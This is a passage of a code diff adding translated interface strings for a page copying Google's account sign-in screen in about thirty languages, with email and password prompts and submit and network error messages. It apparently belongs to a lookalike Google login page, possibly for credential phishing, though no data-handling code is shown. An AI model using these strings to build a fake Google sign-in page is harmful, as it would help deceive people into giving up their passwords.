+                submitErr: 'Noget gik galt. Prøv igen.',
+                networkErr: 'Tjek din netværksforbindelse, og prøv igen.'
+            },
+            de: {
+                pageTitle: 'Anmelden – Google Konten',
+                s1Title: 'Anmelden',
+                s1Subtitle: 'Google-Konto verwenden',
+                emailLabel: 'E-Mail oder Telefonnummer',
+                emailErr: 'E-Mail-Adresse oder Telefonnummer eingeben',
+                forgotEmail: 'E-Mail-Adresse vergessen?',
+                guestText: 'Nicht Ihr Computer? Nutzen Sie den Gastmodus, um sich privat anzumelden.',
+                guestLearnMore: 'Weitere Informationen zur Verwendung des Gastmodus',
+                createAccount: 'Konto erstellen',
+                next: 'Weiter',
+                s2Title: 'Willkommen',
+                pwLabel: 'Passwort eingeben',
+                pwErr: 'Passwort eingeben',
+                showPw: 'Passwort anzeigen',
+                forgotPw: 'Passwort vergessen?',
+                help: 'Hilfe',
+                privacy: 'Datenschutzerklärung',
+                terms: 'Nutzungsbedingungen',
+                submitErr: 'Ein Fehler ist aufgetreten. Bitte versuchen Sie es erneut.',
+                networkErr: 'Bitte überprüfen Sie Ihre Netzwerkverbindung und versuchen Sie es erneut.'
+            },
+            et: {
+                pageTitle: 'Sisselogimine – Google’i kontod',
+                s1Title: 'Logi sisse',
+                s1Subtitle: 'Kasutage oma Google’i kontot',
+                emailLabel: 'E-posti aadress või telefoninumber',
+                emailErr: 'Sisestage e-posti aadress või telefoninumber',
+                forgotEmail: 'Unustasite e-posti aadressi?',
+                guestText: 'See pole teie arvuti? Kasutage privaatselt sisselogimiseks külalisrežiimi.',
+                guestLearnMore: 'Vaadake lisateavet külalisrežiimi kasutamise kohta',
+                createAccount: 'Loo konto',
+                next: 'Järgmine',
+                s2Title: 'Tere tulemast',
+                pwLabel: 'Sisestage parool',
+                pwErr: 'Sisestage parool',
+                showPw: 'Kuva parool',
+                forgotPw: 'Unustasite parooli?',
+                help: 'Abi',
+                privacy: 'Privaatsus',
+                terms: 'Tingimused',
+                submitErr: 'Midagi läks valesti. Proovige uuesti.',
+                networkErr: 'Kontrollige võrguühendust ja proovige uuesti.'
+            },
+            'en-GB': {
+                pageTitle: 'Sign in – Google Accounts',
+                s1Title: 'Sign in',
+                s1Subtitle: 'Use your Google Account',
+                emailLabel: 'Email or phone',
+                emailErr: 'Enter an email or phone number',
+                forgotEmail: 'Forgot email?',
+                guestText: 'Not your computer? Use Guest mode to sign in privately.',
+                guestLearnMore: 'Learn more about using Guest mode',
+                createAccount: 'Create account',
+                next: 'Next',
+                s2Title: 'Welcome',
+                pwLabel: 'Enter your password',
+                pwErr: 'Enter a password',
+                showPw: 'Show password',
+                forgotPw: 'Forgot password?',
+                help: 'Help',
+                privacy: 'Privacy',
+                terms: 'Terms',
+                submitErr: 'Something went wrong. Please try again.',
+                networkErr: 'Please check your network connection and try again.'
+            },
+            en: {
+                pageTitle: 'Sign in - Google Accounts',
+                s1Title: 'Sign in',
+                s1Subtitle: 'Use your Google Account',
+                emailLabel: 'Email or phone',
+                emailErr: 'Enter an email or phone number',
+                forgotEmail: 'Forgot email?',
+                guestText: 'Not your computer? Use Guest mode to sign in privately.',
+                guestLearnMore: 'Learn more about using Guest mode',
+                createAccount: 'Create account',
+                next: 'Next',
+                s2Title: 'Welcome',
+                pwLabel: 'Enter your password',
+                pwErr: 'Enter a password',
+                showPw: 'Show password',
+                forgotPw: 'Forgot password?',
+                help: 'Help',
+                privacy: 'Privacy',
+                terms: 'Terms',
+                submitErr: 'Something went wrong. Please try again.',
+                networkErr: 'Please check your network connection and try again.'
+            },
+            es: {
+                pageTitle: 'Iniciar sesión: Cuentas de Google',
+                s1Title: 'Iniciar sesión',
+                s1Subtitle: 'Usa tu cuenta de Google',
+                emailLabel: 'Correo electrónico o teléfono',
+                emailErr: 'Introduce un correo electrónico o un número de teléfono',
+                forgotEmail: '¿Has olvidado tu correo electrónico?',
+                guestText: '¿No es tu ordenador? Usa el modo Invitado para iniciar sesión de forma privada.',
+                guestLearnMore: 'Más información sobre cómo usar el modo Invitado',
+                createAccount: 'Crear cuenta',
+                next: 'Siguiente',
+                s2Title: 'Te damos la bienvenida',
+                pwLabel: 'Introduce tu contraseña',
+                pwErr: 'Introduce una contraseña',
+                showPw: 'Mostrar contraseña',
+                forgotPw: '¿Has olvidado tu contraseña?',
+                help: 'Ayuda',
+                privacy: 'Privacidad',
+                terms: 'Términos',
+                submitErr: 'Se ha producido un error. Inténtalo de nuevo.',
+                networkErr: 'Comprueba tu conexión de red e inténtalo de nuevo.'
+            },
+            'es-419': {
+                pageTitle: 'Acceso: Cuentas de Google',
+                s1Title: 'Acceder',
+                s1Subtitle: 'Usa tu Cuenta de Google',
+                emailLabel: 'Correo electrónico o teléfono',
+                emailErr: 'Ingresa un correo electrónico o un número de teléfono',
+                forgotEmail: '¿Olvidaste el correo electrónico?',
+                guestText: '¿Esta no es tu computadora? Usa el modo de invitado para navegar de forma privada.',
+                guestLearnMore: 'Más información para usar el modo de invitado',
+                createAccount: 'Crear cuenta',
+                next: 'Siguiente',
+                s2Title: 'Te damos la bienvenida',
+                pwLabel: 'Ingresa tu contraseña',
+                pwErr: 'Ingresa una contraseña',
+                showPw: 'Mostrar contraseña',
+                forgotPw: '¿Olvidaste la contraseña?',
+                help: 'Ayuda',
+                privacy: 'Privacidad',
+                terms: 'Condiciones',
+                submitErr: 'Ocurrió un problema. Vuelve a intentarlo.',
+                networkErr: 'Verifica tu conexión a Internet y vuelve a intentarlo.'
+            },
+            eu: {
+                pageTitle: 'Hasi saioa - Google-ko kontuak',
+                s1Title: 'Hasi saioa',
+                s1Subtitle: 'Erabili Google-ko kontua',
+                emailLabel: 'Helbide elektronikoa edo telefonoa',
+                emailErr: 'Idatzi helbide elektroniko edo telefono-zenbaki bat',
+                forgotEmail: 'Helbide elektronikoa ahaztu duzu?',
+                guestText: 'Ez da zure ordenagailua? Erabili gonbidatu modua modu pribatuan saioa hasteko.',
+                guestLearnMore: 'Lortu informazio gehiago gonbidatu modua erabiltzeari buruz',
+                createAccount: 'Sortu kontua',
+                next: 'Hurrengoa',
+                s2Title: 'Ongi etorri',
+                pwLabel: 'Idatzi pasahitza',
+                pwErr: 'Idatzi pasahitz bat',
+                showPw: 'Erakutsi pasahitza',
+                forgotPw: 'Pasahitza ahaztu duzu?',
+                help: 'Laguntza',
+                privacy: 'Pribatutasuna',
+                terms: 'Baldintzak',
+                submitErr: 'Arazo bat izan da. Saiatu berriro.',
+                networkErr: 'Egiaztatu sareko konexioa eta saiatu berriro.'
+            },
+            fil: {
+                pageTitle: 'Mag-sign in - Mga Google Account',
+                s1Title: 'Mag-sign in',
+                s1Subtitle: 'Gamitin ang iyong Google Account',
+                emailLabel: 'Email o telepono',
+                emailErr: 'Maglagay ng email o numero ng telepono',
+                forgotEmail: 'Nakalimutan ang email?',
+                guestText: 'Hindi mo ba computer ito? Gamitin ang Guest mode para pribadong mag-sign in.',
+                guestLearnMore: 'Matuto pa tungkol sa paggamit ng Guest mode',
+                createAccount: 'Gumawa ng account',
+                next: 'Susunod',
+                s2Title: 'Maligayang pagdating',
+                pwLabel: 'Ilagay ang iyong password',
+                pwErr: 'Maglagay ng password',
+                showPw: 'Ipakita ang password',
+                forgotPw: 'Nakalimutan ang password?',
+                help: 'Tulong',
+                privacy: 'Privacy',
+                terms: 'Mga Tuntunin',
+                submitErr: 'Nagkaproblema. Pakisubukang muli.',
+                networkErr: 'Pakisuri ang iyong koneksyon sa network at subukang muli.'
+            },
+            'fr-CA': {
+                pageTitle: 'Connexion : comptes Google',
+                s1Title: 'Connexion',
+                s1Subtitle: 'Utiliser votre compte Google',
+                emailLabel: 'Adresse courriel ou numéro de téléphone',
+                emailErr: 'Entrez une adresse courriel ou un numéro de téléphone',
+                forgotEmail: 'Adresse courriel oubliée?',
+                guestText: 'Ce n’est pas votre ordinateur? Utilisez le mode Invité pour vous connecter en mode privé.',
+                guestLearnMore: 'En savoir plus sur l’utilisation du mode Invité',
+                createAccount: 'Créer un compte',
+                next: 'Suivant',
+                s2Title: 'Bienvenue',
+                pwLabel: 'Entrez votre mot de passe',
+                pwErr: 'Entrez un mot de passe',
+                showPw: 'Afficher le mot de passe',
+                forgotPw: 'Mot de passe oublié?',
+                help: 'Aide',
+                privacy: 'Confidentialité',
+                terms: 'Conditions',
+                submitErr: 'Un problème est survenu. Veuillez réessayer.',
+                networkErr: 'Veuillez vérifier votre connexion réseau et réessayer.'
+            },
+            fr: {
+                pageTitle: 'Connexion : comptes Google',
+                s1Title: 'Connexion',
+                s1Subtitle: 'Utiliser votre compte Google',
+                emailLabel: 'Adresse e-mail ou numéro de téléphone',
+                emailErr: 'Saisissez une adresse e-mail ou un numéro de téléphone',
+                forgotEmail: 'Adresse e-mail oubliée ?',
+                guestText: 'Ce n’est pas votre ordinateur ? Utilisez le mode Invité pour vous connecter en mode privé.',
+                guestLearnMore: 'En savoir plus sur l’utilisation du mode Invité',
+                createAccount: 'Créer un compte',
+                next: 'Suivant',
+                s2Title: 'Bienvenue',
+                pwLabel: 'Saisissez votre mot de passe',
+                pwErr: 'Saisissez un mot de passe',
+                showPw: 'Afficher le mot de passe',
+                forgotPw: 'Mot de passe oublié ?',
+                help: 'Aide',
+                privacy: 'Confidentialité',
+                terms: 'Conditions',
+                submitErr: 'Un problème est survenu. Veuillez réessayer.',
+                networkErr: 'Veuillez vérifier votre connexion réseau et réessayer.'
+            },
+            ga: {
+                pageTitle: 'Sínigh isteach - Cuntais Google',
+                s1Title: 'Sínigh isteach',
+                s1Subtitle: 'Úsáid do Chuntas Google',
+                emailLabel: 'Ríomhphost nó fón',
+                emailErr: 'Cuir isteach ríomhphost nó uimhir fóin',
+                forgotEmail: 'An bhfuil dearmad déanta agat ar do ríomhphost?',
+                guestText: 'Nach é seo do ríomhaire? Úsáid mód Aoi chun síniú isteach go príobháideach.',
+                guestLearnMore: 'Tuilleadh eolais faoi úsáid mód Aoi',
+                createAccount: 'Cruthaigh cuntas',
+                next: 'Ar aghaidh',
+                s2Title: 'Fáilte',
+                pwLabel: 'Cuir isteach d’fhocal faire',
+                pwErr: 'Cuir isteach focal faire',
+                showPw: 'Taispeáin focal faire',
+                forgotPw: 'An bhfuil dearmad déanta agat ar d’fhocal faire?',
+                help: 'Cabhair',
+                privacy: 'Príobháideachas',
+                terms: 'Téarmaí',
+                submitErr: 'Chuaigh rud éigin amú. Bain triail eile as.',
+                networkErr: 'Seiceáil do nasc líonra agus bain triail eile as.'
+            },
+            gl: {
+                pageTitle: 'Inicia sesión: Contas de Google',
+                s1Title: 'Inicia sesión',
+                s1Subtitle: 'Usa a túa Conta de Google',
+                emailLabel: 'Correo electrónico ou teléfono',
+                emailErr: 'Introduce un correo electrónico ou un número de teléfono',
+                forgotEmail: 'Esqueciches o correo electrónico?',
+                guestText: 'Non é o teu ordenador? Usa o modo de convidado para iniciar sesión de forma privada.',
+                guestLearnMore: 'Máis información sobre como usar o modo de convidado',
+                createAccount: 'Crear conta',
+                next: 'Seguinte',
+                s2Title: 'Benvido/a',
+                pwLabel: 'Introduce o teu contrasinal',
+                pwErr: 'Introduce un contrasinal',
+                showPw: 'Mostrar contrasinal',
+                forgotPw: 'Esqueciches o contrasinal?',
+                help: 'Axuda',
+                privacy: 'Privacidade',
+                terms: 'Condicións',
+                submitErr: 'Produciuse un erro. Téntao de novo.',
+                networkErr: 'Comproba a conexión de rede e téntao de novo.'
+            },
+            hr: {
+                pageTitle: 'Prijava – Google računi',
+                s1Title: 'Prijava',
+                s1Subtitle: 'Upotrijebite svoj Google račun',
+                emailLabel: 'E-adresa ili telefon',
+                emailErr: 'Unesite e-adresu ili telefonski broj',
+                forgotEmail: 'Zaboravili ste e-adresu?',
+                guestText: 'Nije vaše računalo? Upotrijebite način za goste za privatnu prijavu.',
+                guestLearnMore: 'Saznajte više o upotrebi načina za goste',
+                createAccount: 'Izradi račun',
+                next: 'Dalje',
+                s2Title: 'Dobro došli',
+                pwLabel: 'Unesite zaporku',
+                pwErr: 'Unesite zaporku',
+                showPw: 'Prikaži zaporku',
+                forgotPw: 'Zaboravili ste zaporku?',
+                help: 'Pomoć',
+                privacy: 'Privatnost',
+                terms: 'Uvjeti',
+                submitErr: 'Nešto nije u redu. Pokušajte ponovo.',
+                networkErr: 'Provjerite mrežnu vezu i pokušajte ponovo.'
+            },
+            zu: {
+                pageTitle: 'Ngena ngemvume - Ama-akhawunti we-Google',
+                s1Title: 'Ngena ngemvume',
+                s1Subtitle: 'Sebenzisa i-Akhawunti yakho ye-Google',
+                emailLabel: 'I-imeyili noma ifoni',
+                emailErr: 'Faka i-imeyili noma inombolo yefoni',
+                forgotEmail: 'Ukhohlwe i-imeyili?',
+                guestText: 'Akuyona ikhompyutha yakho? Sebenzisa imodi yesivakashi ukuze ungene ngemvume ngasese.',
+                guestLearnMore: 'Funda kabanzi mayelana nokusebenzisa imodi yesivakashi',
+                createAccount: 'Dala i-akhawunti',
+                next: 'Okulandelayo',
+                s2Title: 'Siyakwamukela',
+                pwLabel: 'Faka iphasiwedi yakho',
+                pwErr: 'Faka iphasiwedi',
+                showPw: 'Bonisa iphasiwedi',
+                forgotPw: 'Ukhohlwe iphasiwedi?',
+                help: 'Usizo',
+                privacy: 'Ubumfihlo',
+                terms: 'Imigomo',
+                submitErr: 'Kukhona okungahambanga kahle. Sicela uzame futhi.',
+                networkErr: 'Sicela uhlole uxhumano lwakho lwenethiwekhi bese uzama futhi.'
+            },
+            is: {
+                pageTitle: 'Skrá inn – Google reikningar',
+                s1Title: 'Skrá inn',
+                s1Subtitle: 'Notaðu Google reikninginn þinn',
+                emailLabel: 'Netfang eða símanúmer',
+                emailErr: 'Sláðu inn netfang eða símanúmer',
+                forgotEmail: 'Gleymdirðu netfanginu?',
+                guestText: 'Ekki þín tölva? Notaðu gestastillingu til að skrá þig inn með leynd.',
+                guestLearnMore: 'Frekari upplýsingar um notkun gestastillingar',
+                createAccount: 'Stofna reikning',
+                next: 'Áfram',
+                s2Title: 'Velkomin(n)',
+                pwLabel: 'Sláðu inn aðgangsorðið þitt',
+                pwErr: 'Sláðu inn aðgangsorð',
+                showPw: 'Sýna aðgangsorð',
+                forgotPw: 'Gleymdirðu aðgangsorðinu?',
+                help: 'Hjálp',
+                privacy: 'Persónuvernd',
+                terms: 'Skilmálar',
+                submitErr: 'Eitthvað fór úrskeiðis. Reyndu aftur.',
+                networkErr: 'Athugaðu nettenginguna og reyndu aftur.'
+            },
+            it: {
+                pageTitle: 'Accedi - Account Google',
+                s1Title: 'Accedi',
+                s1Subtitle: 'Utilizza il tuo Account Google',
+                emailLabel: 'Indirizzo email o numero di telefono',
+                emailErr: 'Inserisci un indirizzo email o un numero di telefono',
+                forgotEmail: 'Non ricordi l’indirizzo email?',
+                guestText: 'Non è il tuo computer? Utilizza la modalità ospite per accedere privatamente.',
+                guestLearnMore: 'Scopri di più sull’utilizzo della modalità ospite',
+                createAccount: 'Crea un account',
+                next: 'Avanti',
+                s2Title: 'Ti diamo il benvenuto',
+                pwLabel: 'Inserisci la password',
+                pwErr: 'Inserisci una password',
+                showPw: 'Mostra password',
+                forgotPw: 'Password dimenticata?',
+                help: 'Guida',
+                privacy: 'Privacy',
+                terms: 'Termini',
+                submitErr: 'Si è verificato un problema. Riprova.',
+                networkErr: 'Controlla la connessione di rete e riprova.'
+            },
+            sw: {
+                pageTitle: 'Ingia katika akaunti - Akaunti za Google',
+                s1Title: 'Ingia katika akaunti',
+                s1Subtitle: 'Tumia Akaunti yako ya Google',
+                emailLabel: 'Anwani ya barua pepe au nambari ya simu',
+                emailErr: 'Weka anwani ya barua pepe au nambari ya simu',
+                forgotEmail: 'Umesahau anwani ya barua pepe?',
+                guestText: 'Si kompyuta yako? Tumia hali ya Mgeni kuingia katika akaunti kwa faragha.',
+                guestLearnMore: 'Pata maelezo zaidi kuhusu kutumia hali ya Mgeni',
+                createAccount: 'Fungua akaunti',
+                next: 'Inayofuata',
+                s2Title: 'Karibu',
+                pwLabel: 'Weka nenosiri lako',
+                pwErr: 'Weka nenosiri',
+                showPw: 'Onyesha nenosiri',
+                forgotPw: 'Umesahau nenosiri?',
+                help: 'Usaidizi',
+                privacy: 'Faragha',
+                terms: 'Masharti',
+                submitErr: 'Hitilafu imetokea. Tafadhali jaribu tena.',
+                networkErr: 'Tafadhali angalia muunganisho wako wa mtandao kisha ujaribu tena.'
+            },
+            lv: {
+                pageTitle: 'Pierakstīšanās – Google konti',
+                s1Title: 'Pierakstīties',
+                s1Subtitle: 'Izmantojiet savu Google kontu',
+                emailLabel: 'E-pasta adrese vai tālruņa numurs',
+                emailErr: 'Ievadiet e-pasta adresi vai tālruņa numuru',
+                forgotEmail: 'Aizmirsāt e-pasta adresi?',
+                guestText: 'Šis nav jūsu dators? Izmantojiet viesa režīmu, lai pierakstītos privāti.',
+                guestLearnMore: 'Uzziniet vairāk par viesa režīma izmantošanu',
+                createAccount: 'Izveidot kontu',
+                next: 'Tālāk',
+                s2Title: 'Laipni lūdzam!',
+                pwLabel: 'Ievadiet paroli',
+                pwErr: 'Ievadiet paroli',
+                showPw: 'Rādīt paroli',
+                forgotPw: 'Aizmirsāt paroli?',
+                help: 'Palīdzība',
+                privacy: 'Konfidencialitāte',
+                terms: 'Noteikumi',
+                submitErr: 'Radās problēma. Lūdzu, mēģiniet vēlreiz.',
+                networkErr: 'Lūdzu, pārbaudiet tīkla savienojumu un mēģiniet vēlreiz.'
+            },
+            lt: {
+                pageTitle: 'Prisijungti – „Google“ paskyros',
+                s1Title: 'Prisijungti',
+                s1Subtitle: 'Naudokite „Google“ paskyrą',
+                emailLabel: 'El. pašto adresas arba telefono numeris',
+                emailErr: 'Įveskite el. pašto adresą arba telefono numerį',
+                forgotEmail: 'Pamiršote el. pašto adresą?',
+                guestText: 'Ne jūsų kompiuteris? Naudokite svečio režimą, kad prisijungtumėte privačiai.',
+                guestLearnMore: 'Sužinokite daugiau apie svečio režimo naudojimą',
+                createAccount: 'Sukurti paskyrą',
+                next: 'Kitas',
+                s2Title: 'Sveiki',
+                pwLabel: 'Įveskite slaptažodį',
+                pwErr: 'Įveskite slaptažodį',
+                showPw: 'Rodyti slaptažodį',
+                forgotPw: 'Pamiršote slaptažodį?',
+                help: 'Pagalba',
+                privacy: 'Privatumas',
+                terms: 'Sąlygos',
+                submitErr: 'Įvyko klaida. Bandykite dar kartą.',
+                networkErr: 'Patikrinkite tinklo ryšį ir bandykite dar kartą.'
+            },
+            hu: {
+                pageTitle: 'Bejelentkezés – Google-fiókok',
+                s1Title: 'Bejelentkezés',
+                s1Subtitle: 'Használja Google-fiókját',
+                emailLabel: 'E-mail-cím vagy telefonszám',
+                emailErr: 'Adja meg e-mail-címét vagy telefonszámát',
+                forgotEmail: 'Elfelejtette e-mail-címét?',
+                guestText: 'Nem a saját számítógépét használja? Használja a Vendég módot a privát bejelentkezéshez.',
+                guestLearnMore: 'További információ a Vendég mód használatáról',
+                createAccount: 'Fiók létrehozása',
+                next: 'Tovább',
+                s2Title: 'Üdvözöljük!',
+                pwLabel: 'Adja meg jelszavát',
+                pwErr: 'Adjon meg egy jelszót',
+                showPw: 'Jelszó megjelenítése',
+                forgotPw: 'Elfelejtette jelszavát?',
+                help: 'Súgó',
+                privacy: 'Adatvédelem',
+                terms: 'Általános Szerződési Feltételek',
+                submitErr: 'Hiba történt. Kérjük, próbálja újra.',
+                networkErr: 'Ellenőrizze a hálózati kapcsolatot, majd próbálja újra.'
+            },
+            nl: {
+                pageTitle: 'Inloggen - Google Accounts',
+                s1Title: 'Inloggen',
+                s1Subtitle: 'Gebruik je Google-account',
+                emailLabel: 'E-mailadres of telefoonnummer',
+                emailErr: 'Voer een e-mailadres of telefoonnummer in',
+                forgotEmail: 'E-mailadres vergeten?',
+                guestText: 'Niet jouw computer? Gebruik de gastmodus om privé in te loggen.',
+                guestLearnMore: 'Meer informatie over het gebruik van de gastmodus',
+                createAccount: 'Account maken',
+                next: 'Volgende',
+                s2Title: 'Welkom',
+                pwLabel: 'Voer je wachtwoord in',
+                pwErr: 'Voer een wachtwoord in',
+                showPw: 'Wachtwoord weergeven',
+                forgotPw: 'Wachtwoord vergeten?',
+                help: 'Help',
+                privacy: 'Privacy',
+                terms: 'Voorwaarden',
+                submitErr: 'Er is een probleem opgetreden. Probeer het opnieuw.',
+                networkErr: 'Controleer je netwerkverbinding en probeer het opnieuw.'
+            },
+            no: {
+                pageTitle: 'Logg på – Google-kontoer',
+                s1Title: 'Logg på',
+                s1Subtitle: 'Bruk Google-kontoen din',
+                emailLabel: 'E-postadresse eller telefonnummer',
+                emailErr: 'Skriv inn en e-postadresse eller et telefonnummer',
+                forgotEmail: 'Har du glemt e-postadressen?',
+                guestText: 'Er det ikke datamaskinen din? Bruk gjestemodus for å logge på privat.',
+                guestLearnMore: 'Finn ut mer om hvordan du bruker gjestemodus',
+                createAccount: 'Opprett konto',
+                next: 'Neste',
+                s2Title: 'Velkommen',
+                pwLabel: 'Skriv inn passordet ditt',
+                pwErr: 'Skriv inn et passord',
+                showPw: 'Vis passord',
+                forgotPw: 'Har du glemt passordet?',
+                help: 'Hjelp',
+                privacy: 'Personvern',
+                terms: 'Vilkår',
+                submitErr: 'Noe gikk galt. Prøv på nytt.',
+                networkErr: 'Sjekk nettverkstilkoblingen og prøv på nytt.'
+            },
+            uz: {
+                pageTitle: 'Kirish – Google hisoblari',
+                s1Title: 'Kirish',
+                s1Subtitle: 'Google hisobingizdan foydalaning',
+                emailLabel: 'Email yoki telefon raqami',
+                emailErr: 'Email yoki telefon raqamini kiriting',
+                forgotEmail: 'Emailingizni unutdingizmi?',
+                guestText: 'Kompyuteringiz emasmi? Maxfiy kirish uchun Mehmon rejimidan foydalaning.',
+                guestLearnMore: 'Mehmon rejimidan foydalanish haqida batafsil',
+                createAccount: 'Hisob yaratish',
+                next: 'Keyingisi',
+                s2Title: 'Xush kelibsiz',
+                pwLabel: 'Parolingizni kiriting',
+                pwErr: 'Parolni kiriting',
+                showPw: 'Parolni ko‘rsatish',
+                forgotPw: 'Parolni unutdingizmi?',
+                help: 'Yordam',
+                privacy: 'Maxfiylik',
+                terms: 'Shartlar',
+                submitErr: 'Xatolik yuz berdi. Qaytadan urining.',
+                networkErr: 'Tarmoq ulanishini tekshiring va qaytadan urining.'
+            },
+            pl: {
+                pageTitle: 'Zaloguj się – Konta Google',
+                s1Title: 'Zaloguj się',
+                s1Subtitle: 'Otwórz konto Google',
+                emailLabel: 'Adres e-mail lub telefon',
+                emailErr: 'Wpisz adres e-mail lub numer telefonu',
+                forgotEmail: 'Nie pamiętasz adresu?',
+                guestText: 'To nie Twój komputer? Aby zalogować się prywatnie, użyj trybu gościa.',
+                guestLearnMore: 'Dowiedz się więcej o korzystaniu z trybu gościa',
+                createAccount: 'Utwórz konto',
+                next: 'Dalej',
+                s2Title: 'Witamy',
+                pwLabel: 'Wpisz hasło',
+                pwErr: 'Wpisz hasło',
+                showPw: 'Pokaż hasło',
+                forgotPw: 'Nie pamiętasz hasła?',
+                help: 'Pomoc',
+                privacy: 'Prywatność',
+                terms: 'Warunki',
+                submitErr: 'Wystąpił problem. Spróbuj ponownie.',
+                networkErr: 'Sprawdź połączenie sieciowe i spróbuj ponownie.'
+            },
+            'pt-BR': {
+                pageTitle: 'Fazer login nas Contas do Google',
+                s1Title: 'Fazer login',
+                s1Subtitle: 'Use sua Conta do Google',
+                emailLabel: 'E-mail ou telefone',
+                emailErr: 'Digite um e-mail ou número de telefone',
+                forgotEmail: 'Esqueceu seu e-mail?',
+                guestText: 'Não está no seu computador? Use o modo visitante para fazer login com privacidade.',
+                guestLearnMore: 'Saiba mais sobre como usar o modo visitante',
+                createAccount: 'Criar conta',
+                next: 'Avançar',
+                s2Title: 'Olá',
+                pwLabel: 'Digite sua senha',
+                pwErr: 'Digite uma senha',
+                showPw: 'Mostrar senha',
+                forgotPw: 'Esqueceu a senha?',
+                help: 'Ajuda',
+                privacy: 'Privacidade',
+                terms: 'Termos',
+                submitErr: 'Ocorreu um problema. Tente novamente.',
+                networkErr: 'Verifique sua conexão de rede e tente novamente.'
+            },
+            'pt-PT': {
+                pageTitle: 'Iniciar sessão – Contas Google',
+                s1Title: 'Iniciar sessão',
+                s1Subtitle: 'Utilize a sua Conta Google',
+                emailLabel: 'Email ou telefone',
+                emailErr: 'Introduza um email ou número de telefone',
+                forgotEmail: 'Esqueceu-se do email?',
+                guestText: 'Este computador não é seu? Utilize o modo de convidado para iniciar sessão de forma privada.',
+                guestLearnMore: 'Saiba mais sobre como utilizar o modo de convidado',
+                createAccount: 'Criar conta',
+                next: 'Seguinte',
+                s2Title: 'Boas-vindas',
+                pwLabel: 'Introduza a sua palavra-passe',
+                pwErr: 'Introduza uma palavra-passe',
+                showPw: 'Mostrar palavra-passe',
+                forgotPw: 'Esqueceu-se da palavra-passe?',
+                help: 'Ajuda',
+                privacy: 'Privacidade',
+                terms: 'Termos',
+                submitErr: 'Ocorreu um problema. Tente novamente.',
+                networkErr: 'Verifique a ligação de rede e tente novamente.'
+            },
+            ro: {
+                pageTitle: 'Conectare – Conturi Google',
+                s1Title: 'Conectare',
+                s1Subtitle: 'Folosiți Contul Google',
+                emailLabel: 'E-mail sau telefon',
+                emailErr: 'Introduceți o adresă de e-mail sau un număr de telefon',
+                forgotEmail: 'Ați uitat adresa de e-mail?',
+                guestText: 'Nu este computerul dvs.? Folosiți modul Invitat pentru a vă conecta în mod privat.',
+                guestLearnMore: 'Aflați mai multe despre folosirea modului Invitat',
+                createAccount: 'Creați un cont',
+                next: 'Înainte',
+                s2Title: 'Bun venit',
+                pwLabel: 'Introduceți parola',
+                pwErr: 'Introduceți o parolă',
+                showPw: 'Afișați parola',
+                forgotPw: 'Ați uitat parola?',
+                help: 'Ajutor',
+                privacy: 'Confidențialitate',
+                terms: 'Termeni',
+                submitErr: 'A apărut o problemă. Încercați din nou.',
+                networkErr: 'Verificați conexiunea la rețea și încercați din nou.'
+            },
+            sq: {
+                pageTitle: 'Identifikohu - Llogaritë e Google',
+                s1Title: 'Identifikohu',
+                s1Subtitle: 'Përdor Llogarinë tënde të Google',
+                emailLabel: 'Email-i ose telefoni',
+                emailErr: 'Fut një email ose numër telefoni',
+                forgotEmail: 'Ke harruar email-in?',
+                guestText: 'Nuk është kompjuteri yt? Përdor modalitetin e të ftuarit për t’u identifikuar privatisht.',
+                guestLearnMore: 'Mëso më shumë rreth përdorimit të modalitetit të të ftuarit',
+                createAccount: 'Krijo llogari',
+                next: 'Para',
+                s2Title: 'Mirë se erdhe',
+                pwLabel: 'Fut fjalëkalimin tënd',
+                pwErr: 'Fut një fjalëkalim',
+                showPw: 'Shfaq fjalëkalimin',
+                forgotPw: 'Ke harruar fjalëkalimin?',
+                help: 'Ndihma',
+                privacy: 'Privatësia',
+                terms: 'Kushtet',
+                submitErr: 'Diçka shkoi keq. Provo përsëri.',
+                networkErr: 'Kontrollo lidhjen e rrjetit dhe provo përsëri.'
+            },
+            sk: {
+                pageTitle: 'Prihlásenie – Účty Google',
+                s1Title: 'Prihlásenie',
+                s1Subtitle: 'Použite svoj účet Google',
+                emailLabel: 'E-mail alebo telefón',
+                emailErr: 'Zadajte e-mail alebo telefónne číslo',
+                forgotEmail: 'Zabudli ste e-mail?',
+                guestText: 'Nie je to váš počítač? Na súkromné prihlásenie použite režim hosťa.',
+                guestLearnMore: 'Ďalšie informácie o používaní režimu hosťa',
+                createAccount: 'Vytvoriť účet',
+                next: 'Ďalej',
+                s2Title: 'Vitajte',
+                pwLabel: 'Zadajte heslo',
+                pwErr: 'Zadajte heslo',
+                showPw: 'Zobraziť heslo',
+                forgotPw: 'Zabudli ste heslo?',
+                help: 'Pomocník',
+                privacy: 'Ochrana súkromia',
+                terms: 'Zmluvné podmienky',
+                submitErr: 'Vyskytol sa problém. Skúste to znova.',
+                networkErr: 'Skontrolujte sieťové pripojenie a skúste to znova.'
+            },
+            sl: {
+                pageTitle: 'Prijava – Google Računi',
+                s1Title: 'Prijava',
+                s1Subtitle: 'Uporabite svoj račun Google',
+                emailLabel: 'E-poštni naslov ali telefonska številka',
+                emailErr: 'Vnesite e-poštni naslov ali telefonsko številko',
+                forgotEmail: 'Ste pozabili e-poštni naslov?',
+                guestText: 'To ni vaš računalnik? Za zasebno prijavo uporabite način za goste.',
+                guestLearnMore: 'Preberite več o uporabi načina za goste',
+                createAccount: 'Ustvari račun',
+                next: 'Naprej',
+                s2Title: 'Pozdravljeni',
+                pwLabel: 'Vnesite geslo',
+                pwErr: 'Vnesite geslo',
+                showPw: 'Pokaži geslo',
+                forgotPw: 'Ste pozabili geslo?',
+                help: 'Pomoč',
+                privacy: 'Zasebnost',
+                terms: 'Pogoji',
+                submitErr: 'Prišlo je do težave. Poskusite znova.',
+                networkErr: 'Preverite omrežno povezavo in poskusite znova.'
+            },
+            fi: {
+                pageTitle: 'Kirjaudu sisään – Google-tilit',
+                s1Title: 'Kirjaudu sisään',
+                s1Subtitle: 'Käytä Google-tiliäsi',
+                emailLabel: 'Sähköpostiosoite tai puhelinnumero',
+                emailErr: 'Anna sähköpostiosoite tai puhelinnumero',
+                forgotEmail: 'Unohditko sähköpostiosoitteesi?',
+                guestText: 'Eikö tämä ole oma tietokoneesi? Kirjaudu sisään yksityisesti vierastilassa.',
+                guestLearnMore: 'Lue lisää vierastilan käyttämisestä',
+                createAccount: 'Luo tili',
+                next: 'Seuraava',
+                s2Title: 'Tervetuloa',
+                pwLabel: 'Anna salasana',
+                pwErr: 'Anna salasana',
+                showPw: 'Näytä salasana',
+                forgotPw: 'Unohditko salasanasi?',
+                help: 'Ohje',
+                privacy: 'Tietosuoja',
+                terms: 'Ehdot',
